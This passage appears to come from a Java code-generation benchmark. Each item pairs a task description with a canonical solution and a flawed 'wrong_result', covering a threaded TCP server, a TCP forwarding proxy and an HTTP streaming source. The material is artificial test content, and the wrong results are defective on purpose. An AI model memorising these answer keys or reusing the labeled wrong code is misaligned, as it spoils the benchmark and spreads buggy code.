    "wrong_result": "public class HTTPServer implements AutoCloseable {\n    private ServerSocket server;\n    private Thread thread;\n    private volatile boolean running;\n\n    public HTTPServer() throws IOException {\n        server = new ServerSocket(0);\n        running = true;\n        thread = new Thread(this::serve);\n        thread.start();\n    }\n\n    public int port() {\n        return server.getLocalPort();\n    }\n\n    private void serve() {\n        while (running) {\n            try {\n                Socket clientSocket = server.accept();\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                out.println(\"HTTP/1.1 501 Not Implemented\");\n                out.println(\"Content-Type: text/plain\");\n                out.println();\n                out.println(\"This server does not implement the requested functionality.\");\n                clientSocket.close();\n            } catch (IOException e) {\n                if (!running) {\n                    break;\n                }\n                throw new RuntimeException(e);\n            }\n        }\n    }\n\n    @Override\n    public void close() throws Exception {\n        running = false;\n        server.close();\n        thread.join();\n    }\n}"
  },
  {
    "Task_id": 538,
    "Instruction": "Task Description: Create a TCP server class that handles multiple client connections concurrently, processes incoming requests, and sends responses back to clients.\n\nClass Description: The ViewServer class implements a multi-threaded TCP server that listens on a specified port, accepts client connections, and processes client requests using a thread pool. Each client connection is handled by a separate worker thread.\n\nAttributes:\n- VIEW_SERVER_MAX_CONNECTIONS: [int] - Maximum number of concurrent client connections allowed\n- mServer: [ServerSocket] - Server socket instance for accepting client connections\n- mPort: [int] - Port number on which the server listens\n- mThread: [Thread] - Main server thread\n- mThreadPool: [ExecutorService] - Thread pool for handling client connections\n\nMethods:\n- ViewServer([int port]) -> [void] - Constructor that initializes the server with the specified port\n- start() -> [boolean] - Starts the server thread and thread pool, returns true if successful\n- run() -> [void] - Main server loop that accepts client connections and delegates to worker threads\n- writeValue([Socket client, String value]) -> [boolean] - Helper method to write a response to a client socket\n- ViewServerWorker([Socket client]) -> [void] - Nested class constructor for handling individual client connections\n- run() -> [void] - Worker thread method that processes client requests and sends responses",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class ViewServer implements Runnable {\n    private static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    private ServerSocket mServer;\n    private final int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    private ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() throws IOException {\n        if (mThread != null) {\n            return false;\n        }\n\n        mThread = new Thread(this, \"Local View Server [port=\" + mPort + \"]\");\n        mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n        mThread.start();\n\n        return true;\n    }\n\n    @Override\n    public void run() {\n        try {\n            mServer = new ServerSocket(mPort, VIEW_SERVER_MAX_CONNECTIONS, InetAddress.getLocalHost());\n        } catch (Exception e) {\n            return;\n        }\n\n        while (mServer != null && Thread.currentThread() == mThread) {\n            try {\n                Socket client = mServer.accept();\n                if (mThreadPool != null) {\n                    mThreadPool.submit(new ViewServerWorker(client));\n                } else {\n                    try {\n                        client.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            } catch (Exception e) {\n                break;\n            }\n        }\n    }\n\n    private static boolean writeValue(Socket client, String value) {\n        boolean result;\n        BufferedWriter out = null;\n        try {\n            OutputStream clientStream = client.getOutputStream();\n            out = new BufferedWriter(new OutputStreamWriter(clientStream), 8 * 1024);\n            out.write(value);\n            out.write(\"\\n\");\n            out.flush();\n            result = true;\n        } catch (Exception e) {\n            result = false;\n        } finally {\n            if (out != null) {\n                try {\n                    out.close();\n                } catch (IOException e) {\n                    result = false;\n                }\n            }\n        }\n        return result;\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket mClient;\n\n        private ViewServerWorker(Socket client) {\n            mClient = client;\n        }\n\n        @Override\n        public void run() {\n            BufferedReader in = null;\n            try {\n                in = new BufferedReader(new InputStreamReader(mClient.getInputStream()), 1024);\n                final String request = in.readLine();\n\n                String command;\n                String parameters;\n\n                int index = request.indexOf(' ');\n                if (index == -1) {\n                    command = request;\n                    parameters = \"\";\n                } else {\n                    command = request.substring(0, index);\n                    parameters = request.substring(index + 1);\n                }\n\n                boolean result = writeValue(mClient, \"RESPONSE\");\n            } catch (IOException e) {\n            } finally {\n                if (in != null) {\n                    try {\n                        in.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n                if (mClient != null) {\n                    try {\n                        mClient.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class ViewServer {\n    private static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    private ServerSocket mServer;\n    private int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    public ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() {\n        try {\n            mServer = new ServerSocket(mPort);\n            mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n            mThread = new Thread(this);\n            mThread.start();\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Socket client = mServer.accept();\n                mThreadPool.submit(new ViewServerWorker(client));\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n\n    private boolean writeValue(Socket client, String value) {\n        try {\n            OutputStream out = client.getOutputStream();\n            out.write(value.getBytes());\n            out.flush();\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket client;\n\n        public ViewServerWorker(Socket client) {\n            this.client = client;\n        }\n\n        @Override\n        public void run() {\n            try {\n                InputStream in = client.getInputStream();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n                String request = reader.readLine();\n                String response = \"Response: \" + request;\n                writeValue(client, response);\n            } catch (IOException e) {\n                // Handle exception\n            } finally {\n                try {\n                    client.close();\n                } catch (IOException e) {\n                    // Handle exception\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 539,
    "Instruction": "Task Description: Create a TCP proxy server class that can forward traffic between a client and a remote server, with the ability to start, stop, and manage connections.\n\nClass Description: The ConnectionManipulationProxyServer class implements a TCP proxy server that listens on a local port, accepts client connections, and forwards traffic to a specified remote server. It provides thread-safe control over the proxy operation and proper resource cleanup.\n\nAttributes:\n- localPort: [int] - The local port number the proxy listens on\n- host: [String] - The hostname or IP address of the remote server\n- remotePort: [int] - The port number of the remote server\n- proxyThread: [Thread] - The thread running the proxy operation\n- enableLock: [Object] - Synchronization object for thread-safe control\n- enableProxy: [boolean] - Flag indicating whether proxy is enabled\n- running: [boolean] - Flag indicating whether proxy thread should continue running\n- client: [Socket] - Socket for client connection\n- server: [Socket] - Socket for server connection\n- serverSocket: [ServerSocket] - Server socket for accepting client connections\n\nMethods:\n- ConnectionManipulationProxyServer(String host, int remotePort, int localPort) -> [void] - Constructor that initializes the proxy server with target host and ports\n- startProxy() -> [void] - Starts the proxy server thread and enables traffic forwarding\n- stopProxy() -> [void] - Stops the proxy server thread and disables traffic forwarding\n- killOpenSockets() -> [void] - Closes all open sockets and cleans up resources\n- run() -> [void] - Main proxy thread implementation that handles connection forwarding\n- getLocalPort() -> [int] - Returns the local port number the proxy is listening on",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.logging.Logger;\n\npublic class ConnectionManipulationProxyServer implements Runnable {\n    private static final Logger log = Logger.getLogger(ConnectionManipulationProxyServer.class.getName());\n    private int localPort;\n    private String host;\n    private int remotePort;\n    private Thread proxyThread;\n    private final Object enableLock = new Object();\n    private boolean enableProxy = true;\n    private boolean running = true;\n    Socket client = null, server = null;\n    ServerSocket serverSocket = null;\n\n    public ConnectionManipulationProxyServer(String host, int remotePort, int localPort) {\n        this.localPort = localPort;\n        this.remotePort = remotePort;\n        this.host = host;\n        proxyThread = new Thread(this);\n    }\n\n    public void startProxy() {\n        log.info(\"[CMPS Proxy] - Starting Proxy\");\n        synchronized (enableLock) {\n            enableProxy = true;\n        }\n        running = true;\n        proxyThread.start();\n    }\n\n    public void stopProxy() {\n        log.info(\"[CMPS Proxy] - Stopping Proxy\");\n        synchronized (enableLock) {\n            enableProxy = false;\n        }\n        running = false;\n        killOpenSockets();\n    }\n\n    private void killOpenSockets() {\n        log.info(\"[CMPS Proxy] - killOpenSockets Called.\");\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n            if (client != null) {\n                client.close();\n            }\n            if (server != null) {\n                server.close();\n            }\n        } catch (IOException ex) {\n            // Ignore during cleanup\n        }\n    }\n\n    @Override\n    public void run() {\n        log.info(\"[CMPS Proxy] - Proxy Thread running.\");\n        try {\n            final byte[] request = new byte[1024];\n            byte[] reply = new byte[4096];\n            boolean canIrun = true;\n            \n            while (running) {\n                synchronized (enableLock) {\n                    canIrun = enableProxy;\n                }\n                \n                while (canIrun) {\n                    synchronized (enableLock) {\n                        canIrun = enableProxy;\n                        if (!enableProxy) {\n                            break;\n                        }\n                    }\n                    \n                    if (serverSocket == null || serverSocket.isClosed()) {\n                        serverSocket = new ServerSocket(localPort);\n                        localPort = serverSocket.getLocalPort();\n                    }\n                    \n                    log.info(\"[CMPS Proxy] - Waiting for incoming connection..\");\n                    client = serverSocket.accept();\n                    log.info(\"[CMPS Proxy] - Client Opened Connection to Proxy...\");\n                    \n                    final InputStream streamFromClient = client.getInputStream();\n                    final OutputStream streamToClient = client.getOutputStream();\n                    \n                    server = new Socket(host, remotePort);\n                    log.info(\"Proxy: Proxy Connected to Server\");\n                    \n                    final InputStream streamFromServer = server.getInputStream();\n                    final OutputStream streamToServer = server.getOutputStream();\n                    \n                    Thread thread = new Thread() {\n                        public void run() {\n                            int bytesRead;\n                            try {\n                                while ((bytesRead = streamFromClient.read(request)) != -1) {\n                                    streamToServer.write(request, 0, bytesRead);\n                                    streamToServer.flush();\n                                }\n                            } catch (IOException ex) {\n                                log.warning(\"[CMPS Proxy] - IOException in client to server stream: \" + ex.getMessage());\n                                try {\n                                    client.close();\n                                    server.close();\n                                } catch (IOException e) {\n                                    // Ignore during cleanup\n                                }\n                            }\n                        }\n                    };\n                    \n                    thread.start();\n                    \n                    int bytesRead;\n                    try {\n                        while ((bytesRead = streamFromServer.read(reply)) != -1) {\n                            streamToClient.write(reply, 0, bytesRead);\n                            streamToClient.flush();\n                        }\n                    } catch (IOException ex) {\n                        log.warning(\"[CMPS Proxy] - IOException in server to client stream: \" + ex.getMessage());\n                        client.close();\n                        server.close();\n                    }\n                    \n                    streamToClient.close();\n                }\n            }\n            \n            if (!serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n            \n        } catch (IOException ex) {\n            log.warning(\"[CMPS Proxy] - Thread Connection lost: \" + ex.getMessage());\n        }\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class ConnectionManipulationProxyServer {\n    private String host;\n    private int remotePort;\n    private int localPort;\n    private Thread proxyThread;\n    private Object enableLock = new Object();\n    private boolean enableProxy = false;\n    private boolean running = false;\n    private Socket client;\n    private Socket server;\n    private ServerSocket serverSocket;\n\n    public ConnectionManipulationProxyServer(String host, int remotePort, int localPort) {\n        this.host = host;\n        this.remotePort = remotePort;\n        this.localPort = localPort;\n    }\n\n    public void startProxy() {\n        synchronized (enableLock) {\n            if (!enableProxy) {\n                enableProxy = true;\n                proxyThread = new Thread(this::run);\n                proxyThread.start();\n                running = true;\n            }\n        }\n    }\n\n    public void stopProxy() {\n        synchronized (enableLock) {\n            enableProxy = false;\n            running = false;\n            if (proxyThread != null) {\n                proxyThread.interrupt();\n            }\n        }\n    }\n\n    public void killOpenSockets() {\n        synchronized (enableLock) {\n            if (serverSocket != null) {\n                try {\n                    serverSocket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (client != null) {\n                try {\n                    client.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (server != null) {\n                try {\n                    server.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public void run() {\n        try {\n            serverSocket = new ServerSocket(localPort);\n            while (running && enableProxy) {\n                this.client = serverSocket.accept();\n                this.server = new Socket(host, remotePort);\n                forward(this.client, this.server);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            killOpenSockets();\n        }\n    }\n\n    private void forward(Socket client, Socket server) {\n        Thread clientToServer = new Thread(() -> {\n            try {\n                byte[] buffer = new byte[1024];\n                int len;\n                while ((len = client.getInputStream().read(buffer)) > 0) {\n                    server.getOutputStream().write(buffer, 0, len);\n                    server.getOutputStream().flush();\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    client.close();\n                    server.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        });\n\n        Thread serverToClient = new Thread(() -> {\n            try {\n                byte[] buffer = new byte[1024];\n                int len;\n                while ((len = server.getInputStream().read(buffer)) > 0) {\n                    client.getOutputStream().write(buffer, 0, len);\n                    client.getOutputStream().flush();\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    client.close();\n                    server.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        });\n\n        clientToServer.start();\n        serverToClient.start();\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n}"
  },
  {
    "Task_id": 54,
    "Instruction": "Task Description: Implement a Java class that handles HTTP URL connections for streaming content with support for caching, custom headers, and partial content requests.\n\nClass Description: HttpUrlSource is a class designed to manage HTTP connections for streaming media content. It supports range requests, handles redirects, injects custom headers, and caches source information (URL, content length, MIME type). The class provides methods to open, read, and close connections while managing connection timeouts and redirects.\n\nAttributes:\n\nsourceInfoStorage: [SourceInfoStorage] - Storage for caching source information (URL, length, MIME type)\nheaderInjector: [HeaderInjector] - Injects custom headers into HTTP requests\nsourceInfo: [SourceInfo] - Contains information about the media source (URL, length, MIME type)\nconnection: [HttpURLConnection] - Active HTTP connection\ninputStream: [InputStream] - Input stream for reading content\n\nMethods:\n\nlength(): [long] - Returns the content length of the source, fetching it if not already cached\nopen([long] offset) -> [void] - Opens a connection to the source with optional byte offset\nclose() -> [void] - Closes the current connection\nread([byte[]] buffer) -> [int] - Reads data from the input stream into the buffer\ngetMime() -> [String] - Returns the MIME type of the source, fetching it if not already cached\ngetUrl() -> [String] - Returns the source URL\nfetchContentInfo() -> [void] - Fetches and caches content information (length and MIME type)\nopenConnection([long] offset, [int] timeout) -> [HttpURLConnection] - Opens a connection with optional offset and timeout, handling redirects\ninjectCustomHeaders([HttpURLConnection] connection, [String] url) -> [void] - Injects custom headers into the connection\nreadSourceAvailableBytes([HttpURLConnection] connection, [long] offset, [int] responseCode) -> [long] - Calculates available bytes based on response code\ngetContentLength([HttpURLConnection] connection) -> [long] - Extracts content length from connection headers",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.danikula.videocache.headers.HeaderInjector;\nimport com.danikula.videocache.sourcestorage.SourceInfoStorage;\nimport java.io.BufferedInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InterruptedIOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport static com.danikula.videocache.Preconditions.checkNotNull;\nimport static com.danikula.videocache.ProxyCacheUtils.DEFAULT_BUFFER_SIZE;\nimport static java.net.HttpURLConnection.HTTP_MOVED_PERM;\nimport static java.net.HttpURLConnection.HTTP_MOVED_TEMP;\nimport static java.net.HttpURLConnection.HTTP_OK;\nimport static java.net.HttpURLConnection.HTTP_PARTIAL;\nimport static java.net.HttpURLConnection.HTTP_SEE_OTHER;\n\npublic class HttpUrlSource {\n\n    private static final int MAX_REDIRECTS = 5;\n    private final SourceInfoStorage sourceInfoStorage;\n    private final HeaderInjector headerInjector;\n    private SourceInfo sourceInfo;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HeaderInjector headerInjector) {\n        this.sourceInfoStorage = checkNotNull(sourceInfoStorage);\n        this.headerInjector = checkNotNull(headerInjector);\n        SourceInfo sourceInfo = sourceInfoStorage.get(url);\n        this.sourceInfo = sourceInfo != null ? sourceInfo :\n                new SourceInfo(url, Integer.MIN_VALUE, ProxyCacheUtils.getSupposablyMime(url));\n    }\n\n    public synchronized long length() throws ProxyCacheException {\n        if (sourceInfo.length == Integer.MIN_VALUE) {\n            fetchContentInfo();\n        }\n        return sourceInfo.length;\n    }\n\n    public void open(long offset) throws ProxyCacheException {\n        try {\n            connection = openConnection(offset, -1);\n            String mime = connection.getContentType();\n            inputStream = new BufferedInputStream(connection.getInputStream(), DEFAULT_BUFFER_SIZE);\n            long length = readSourceAvailableBytes(connection, offset, connection.getResponseCode());\n            this.sourceInfo = new SourceInfo(sourceInfo.url, length, mime);\n            this.sourceInfoStorage.put(sourceInfo.url, sourceInfo);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error opening connection for \" + sourceInfo.url + \" with offset \" + offset, e);\n        }\n    }\n\n    private long readSourceAvailableBytes(HttpURLConnection connection, long offset, int responseCode) throws IOException {\n        long contentLength = getContentLength(connection);\n        return responseCode == HTTP_OK ? contentLength\n                : responseCode == HTTP_PARTIAL ? contentLength + offset : sourceInfo.length;\n    }\n\n    private long getContentLength(HttpURLConnection connection) {\n        String contentLengthValue = connection.getHeaderField(\"Content-Length\");\n        return contentLengthValue == null ? -1 : Long.parseLong(contentLengthValue);\n    }\n\n    public void close() throws ProxyCacheException {\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (NullPointerException | IllegalArgumentException e) {\n                throw new RuntimeException(\"Error closing connection\", e);\n            }\n        }\n    }\n\n    public int read(byte[] buffer) throws ProxyCacheException {\n        if (inputStream == null) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url + \": connection is absent!\");\n        }\n        try {\n            return inputStream.read(buffer, 0, buffer.length);\n        } catch (InterruptedIOException e) {\n            throw new InterruptedProxyCacheException(\"Reading source \" + sourceInfo.url + \" is interrupted\", e);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url, e);\n        }\n    }\n\n    private void fetchContentInfo() throws ProxyCacheException {\n        HttpURLConnection urlConnection = null;\n        InputStream inputStream = null;\n        try {\n            urlConnection = openConnection(0, 10000);\n            long length = getContentLength(urlConnection);\n            String mime = urlConnection.getContentType();\n            inputStream = urlConnection.getInputStream();\n            this.sourceInfo = new SourceInfo(sourceInfo.url, length, mime);\n            this.sourceInfoStorage.put(sourceInfo.url, sourceInfo);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error fetching info from \" + sourceInfo.url, e);\n        } finally {\n            ProxyCacheUtils.close(inputStream);\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n\n    private HttpURLConnection openConnection(long offset, int timeout) throws IOException, ProxyCacheException {\n        HttpURLConnection connection;\n        boolean redirected;\n        int redirectCount = 0;\n        String url = this.sourceInfo.url;\n        do {\n            connection = (HttpURLConnection) new URL(url).openConnection();\n            injectCustomHeaders(connection, url);\n            if (offset > 0) {\n                connection.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n            }\n            if (timeout > 0) {\n                connection.setConnectTimeout(timeout);\n                connection.setReadTimeout(timeout);\n            }\n            int code = connection.getResponseCode();\n            redirected = code == HTTP_MOVED_PERM || code == HTTP_MOVED_TEMP || code == HTTP_SEE_OTHER;\n            if (redirected) {\n                url = connection.getHeaderField(\"Location\");\n                redirectCount++;\n                connection.disconnect();\n            }\n            if (redirectCount > MAX_REDIRECTS) {\n                throw new ProxyCacheException(\"Too many redirects: \" + redirectCount);\n            }\n        } while (redirected);\n        return connection;\n    }\n\n    private void injectCustomHeaders(HttpURLConnection connection, String url) {\n        Map<String, String> extraHeaders = headerInjector.addHeaders(url);\n        for (Map.Entry<String, String> header : extraHeaders.entrySet()) {\n            connection.setRequestProperty(header.getKey(), header.getValue());\n        }\n    }\n\n    public synchronized String getMime() throws ProxyCacheException {\n        if (TextUtils.isEmpty(sourceInfo.mime)) {\n            fetchContentInfo();\n        }\n        return sourceInfo.mime;\n    }\n\n    public String getUrl() {\n        return sourceInfo.url;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpUrlSource {\n    private SourceInfoStorage sourceInfoStorage;\n    private HeaderInjector headerInjector;\n    private SourceInfo sourceInfo;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n\n    public HttpUrlSource(SourceInfoStorage sourceInfoStorage, HeaderInjector headerInjector) {\n        this.sourceInfoStorage = sourceInfoStorage;\n        this.headerInjector = headerInjector;\n    }\n\n    public long length() {\n        if (sourceInfo != null && sourceInfo.getLength() != -1) {\n            return sourceInfo.getLength();\n        }\n        fetchContentInfo();\n        return sourceInfo.getLength();\n    }\n\n    public void open(long offset) {\n        connection = openConnection(offset, 5000);\n        if (connection != null) {\n            try {\n                inputStream = connection.getInputStream();\n            } catch (IOException e) {\n                inputStream = null;\n            }\n        }\n    }\n\n    public void close() {\n        if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n        if (connection != null) {\n            connection.disconnect();\n        }\n    }\n\n    public int read(byte[] buffer) {\n        if (inputStream == null) {\n            return -1;\n        }\n        try {\n            return inputStream.read(buffer);\n        } catch (IOException e) {\n            return -1;\n        }\n    }\n\n    public String getMime() {\n        if (sourceInfo != null && sourceInfo.getMime() != null) {\n            return sourceInfo.getMime();\n        }\n        fetchContentInfo();\n        return sourceInfo.getMime();\n    }\n\n    public String getUrl() {\n        return sourceInfo.getUrl();\n    }\n\n    public void fetchContentInfo() {\n        if (sourceInfo == null) {\n            sourceInfo = new SourceInfo();\n        }\n        connection = openConnection(0, 5000);\n        if (connection != null) {\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                sourceInfo.setLength(getContentLength(connection));\n                sourceInfo.setMime(getContentMime(connection));\n                sourceInfo.setUrl(connection.getURL().toString());\n            }\n        }\n    }\n\n    private HttpURLConnection openConnection(long offset, int timeout) {\n        String url = sourceInfo.getUrl();\n        HttpURLConnection conn = null;\n        try {\n            URL urlObj = new URL(url);\n            conn = (HttpURLConnection) urlObj.openConnection();\n            conn.setConnectTimeout(timeout);\n            conn.setReadTimeout(timeout);\n            injectCustomHeaders(conn, url);\n            if (offset >= 0) {\n                conn.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n            }\n            int responseCode = conn.getResponseCode();\n            while (responseCode >= 300 && responseCode < 400) {\n                String location = conn.getHeaderField(\"Location\");\n                if (location == null) {\n                    break;\n                }\n                url = location;\n                urlObj = new URL(url);\n                conn = (HttpURLConnection) urlObj.openConnection();\n                conn.setConnectTimeout(timeout);\n                conn.setReadTimeout(timeout);\n                injectCustomHeaders(conn, url);\n                if (offset >= 0) {\n                    conn.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n                }\n                responseCode = conn.getResponseCode();\n            }\n        } catch (IOException e) {\n            // Handle exception\n        }\n        return conn;\n    }\n\n    private void injectCustomHeaders(HttpURLConnection connection, String url) {\n        headerInjector.injectHeaders(connection, url);\n    }\n\n    private long readSourceAvailableBytes(HttpURLConnection connection, long offset, int responseCode) {\n        if (responseCode == HttpURLConnection.HTTP_PARTIAL) {\n            return getContentLength(connection);\n        } else if (responseCode == HttpURLConnection.HTTP_OK) {\n            long totalLength = getContentLength(connection);\n            return totalLength - offset;\n        }\n        return -1;\n    }\n\n    private long getContentLength(HttpURLConnection connection) {\n        String contentLengthHeader = connection.getHeaderField(\"Content-Length\");\n        return contentLengthHeader != null ? Long.parseLong(contentLengthHeader) : -1;\n    }\n\n    private String getContentMime(HttpURLConnection connection) {\n        String contentType = connection.getHeaderField(\"Content-Type\");\n        return contentType != null ? contentType : \"application/octet-stream\";\n    }\n}"
  },
  {
    "Task_id": 540,
    "Instruction": "Task Description: Implement a TCP proxy server class that can forward traffic between a client and a remote server, with the ability to start, stop, and manage connections dynamically.\n\nClass Description: The ConnectionManipulationProxyServer class acts as a TCP proxy that listens on a local port, accepts client connections, and forwards traffic to a specified remote host and port. It provides thread-safe control over the proxy's operation and proper resource cleanup.\n\nAttributes:\n- localPort: [int] - The local port on which the proxy listens for client connections\n- host: [String] - The remote host address to which traffic will be forwarded\n- remotePort: [int] - The remote port to which traffic will be forwarded\n- proxyThread: [Thread] - The thread running the proxy operation\n- enableLock: [Object] - Synchronization lock for thread-safe operation control\n- enableProxy: [boolean] - Flag indicating whether the proxy is currently enabled\n- running: [boolean] - Flag indicating whether the proxy thread should continue running\n- client: [Socket] - The client-side socket connection\n- server: [Socket] - The server-side socket connection\n- serverSocket: [ServerSocket] - The server socket listening for client connections\n\nMethods:\n- ConnectionManipulationProxyServer([String host, int remotePort, int localPort]) -> [void] - Constructor that initializes the proxy with target host and port information\n- startProxy() -> [void] - Starts the proxy server thread and enables traffic forwarding\n- stopProxy() -> [void] - Stops the proxy server thread and disables traffic forwarding\n- killOpenSockets() -> [void] - Closes all open sockets and cleans up resources\n- run() -> [void] - Main proxy thread execution method that handles connection setup and data forwarding\n- getLocalPort() -> [int] - Returns the local port on which the proxy is listening",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.logging.Logger;\n\npublic class ConnectionManipulationProxyServer implements Runnable {\n    private static final Logger log = Logger.getLogger(ConnectionManipulationProxyServer.class.getName());\n    private int localPort;\n    private String host;\n    private int remotePort;\n    private Thread proxyThread;\n    private final Object enableLock = new Object();\n    private boolean enableProxy = true;\n    private boolean running = true;\n    private Socket client = null;\n    private Socket server = null;\n    private ServerSocket serverSocket = null;\n\n    public ConnectionManipulationProxyServer(String host, int remotePort, int localPort) {\n        this.localPort = localPort;\n        this.remotePort = remotePort;\n        this.host = host;\n        this.proxyThread = new Thread(this);\n    }\n\n    public void startProxy() {\n        log.info(\"[CMPS Proxy] - Starting Proxy\");\n        synchronized (enableLock) {\n            enableProxy = true;\n        }\n        running = true;\n        proxyThread.start();\n    }\n\n    public void stopProxy() {\n        log.info(\"[CMPS Proxy] - Stopping Proxy\");\n        synchronized (enableLock) {\n            enableProxy = false;\n        }\n        running = false;\n        killOpenSockets();\n    }\n\n    private void killOpenSockets() {\n        log.info(\"[CMPS Proxy] - killOpenSockets Called.\");\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n            if (client != null) {\n                client.close();\n            }\n            if (server != null) {\n                server.close();\n            }\n        } catch (IOException ex) {\n            // Ignore during cleanup\n        }\n    }\n\n    @Override\n    public void run() {\n        log.info(\"[CMPS Proxy] - Proxy Thread running.\");\n        try {\n            final byte[] request = new byte[1024];\n            byte[] reply = new byte[4096];\n            \n            while (running) {\n                synchronized (enableLock) {\n                    if (!enableProxy) continue;\n                }\n\n                if (serverSocket == null || serverSocket.isClosed()) {\n                    serverSocket = new ServerSocket(localPort);\n                    localPort = serverSocket.getLocalPort();\n                }\n\n                log.info(\"[CMPS Proxy] - Waiting for incoming connection..\");\n                \n                try {\n                    client = serverSocket.accept();\n                    log.info(\"[CMPS Proxy] - Client Opened Connection to Proxy...\");\n                    \n                    final InputStream streamFromClient = client.getInputStream();\n                    final OutputStream streamToClient = client.getOutputStream();\n                    \n                    server = new Socket(host, remotePort);\n                    log.info(\"Proxy: Proxy Connected to Server\");\n                    \n                    final InputStream streamFromServer = server.getInputStream();\n                    final OutputStream streamToServer = server.getOutputStream();\n                    \n                    Thread thread = new Thread() {\n                        public void run() {\n                            int bytesRead;\n                            try {\n                                while ((bytesRead = streamFromClient.read(request)) != -1) {\n                                    streamToServer.write(request, 0, bytesRead);\n                                    streamToServer.flush();\n                                }\n                            } catch (IOException ex) {\n                                log.warning(\"[CMPS Proxy] - IOException in client to server stream: \" + ex.getMessage());\n                                try {\n                                    client.close();\n                                    server.close();\n                                } catch (IOException e) {\n                                    // Ignore during cleanup\n                                }\n                            }\n                        }\n                    };\n                    thread.start();\n                    \n                    int bytesRead;\n                    try {\n                        while ((bytesRead = streamFromServer.read(reply)) != -1) {\n                            streamToClient.write(reply, 0, bytesRead);\n                            streamToClient.flush();\n                        }\n                    } catch (IOException ex) {\n                        log.warning(\"[CMPS Proxy] - IOException in server to client stream: \" + ex.getMessage());\n                        client.close();\n                        server.close();\n                    }\n                    \n                    streamToClient.close();\n                    \n                } catch (IOException ex) {\n                    log.warning(\"[CMPS Proxy] - General IO Exception caught in main Thread: \" + ex.getMessage());\n                    break;\n                } finally {\n                    try {\n                        if (server != null) {\n                            server.close();\n                        }\n                        if (client != null) {\n                            client.close();\n                        }\n                    } catch (IOException ex) {\n                        log.warning(\"[CMPS Proxy] - IOException caught whilst closing proxy connection: \" + ex.getMessage());\n                    }\n                }\n            }\n            \n            if (!serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n            log.info(\"[CMPS Proxy] - Server Socket Closed, returning...\");\n            \n        } catch (IOException ex) {\n            log.warning(\"[CMPS Proxy] - Thread Connection lost: \" + ex.getMessage());\n            ex.printStackTrace();\n        }\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
